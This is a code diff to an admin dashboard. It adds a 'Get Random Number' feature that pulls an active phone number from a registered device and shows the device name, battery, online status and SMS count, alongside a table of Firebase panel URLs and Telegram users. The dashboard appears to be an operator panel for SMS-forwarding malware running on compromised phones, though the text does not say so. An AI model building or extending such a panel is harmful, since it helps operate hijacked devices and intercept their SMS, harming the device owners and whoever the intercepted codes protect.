@@ -648,6 +648,13 @@ tbody tr:hover{background:rgba(0,229,200,.04)}
           </div>
         </div>
         <div class="card">
+          <div class="card-header"><span class="card-title"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Admin Number Room</span></div>
+          <div class="card-body">
+            <button class="btn btn-primary btn-full" onclick="adminGetNumber(this)"><span id="admin-num-spin" style="display:none" class="spin"></span><svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>Get Random Number</button>
+            <div id="admin-number-result" class="empty" style="margin-top:10px">No admin number generated yet</div>
+          </div>
+        </div>
+        <div class="card">
           <div class="card-header"><span class="card-title"><svg viewBox="0 0 24 24"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>Registered Panels</span><button class="btn btn-danger btn-sm" onclick="clearAllPanels(this)"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Clear All</button></div>
           <div class="card-body" style="padding:0"><div class="tbl-wrap"><table><thead><tr><th>#</th><th>Name</th><th>Firebase URL</th><th>Added</th><th>Action</th></tr></thead><tbody id="panels-tbody"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody></table></div></div>
         </div>
@@ -816,6 +823,7 @@ async function addBulkPanels(){
 }
 async function delPanel(id,btn){if(!confirm('Delete this panel?'))return;btn.disabled=true;try{const r=await fetch(B+'/api/panels/'+id,{method:'DELETE'});if(r.ok){toast('Deleted');loadPanels();loadDashboard();}else toast('Failed',false);}catch{toast('Error',false);}finally{btn.disabled=false;}}
 async function clearAllPanels(btn){if(!confirm('Delete ALL saved Firebase panels?'))return;if(!confirm('Confirm again: this will remove every Firebase URL from the database.'))return;btn.disabled=true;try{const r=await fetch(B+'/api/panels',{method:'DELETE'});if(r.ok){const d=await r.json();toast('Deleted '+(d.deleted||0)+' panels');loadPanels();loadDashboard();}else toast('Clear failed',false);}catch{toast('Network error',false);}finally{btn.disabled=false;}}
+async function adminGetNumber(btn){const box=document.getElementById('admin-number-result'),sp=document.getElementById('admin-num-spin');btn.disabled=true;sp.style.display='';box.innerHTML='Searching active number…';try{const r=await fetch(B+'/api/panels/random-number',{cache:'no-store'});const d=await r.json();if(r.ok){box.innerHTML='<div style="text-align:left;line-height:1.8"><b>Random Number Generated</b><br><span style="color:var(--dim)">Number</span> <span class="mono" style="color:var(--c)">'+esc(d.number||'—')+'</span><br><span style="color:var(--dim)">Device</span> '+esc(d.deviceName||d.deviceId)+'<br><span style="color:var(--dim)">Panel</span> '+esc(d.panelName)+' (#'+esc(d.panelId)+')<br><span style="color:var(--dim)">Status</span> <span class="badge b-on">'+esc(d.status||'online')+'</span><br><span style="color:var(--dim)">Battery</span> '+esc(d.battery||'—')+'<br><span style="color:var(--dim)">SMS</span> '+esc(d.totalSms||0)+'</div>';toast('Admin number generated');}else{box.innerHTML=esc(d.error||'No active number found');toast(d.error||'No active number found',false);}}catch{box.innerHTML='Network error';toast('Network error',false);}finally{sp.style.display='none';btn.disabled=false;}}
 let _all=[];
 async function loadUsers(){try{_all=await(await fetch(B+'/api/users')).json();renderUsers(_all);}catch{toast('Users load failed',false);}}
 function searchUsers(){const q=document.getElementById('u-search').value.toLowerCase();renderUsers(_all.filter(u=>(u.firstName||'').toLowerCase().includes(q)||(u.username||'').toLowerCase().includes(q)||(u.telegramId||'').includes(q)));}
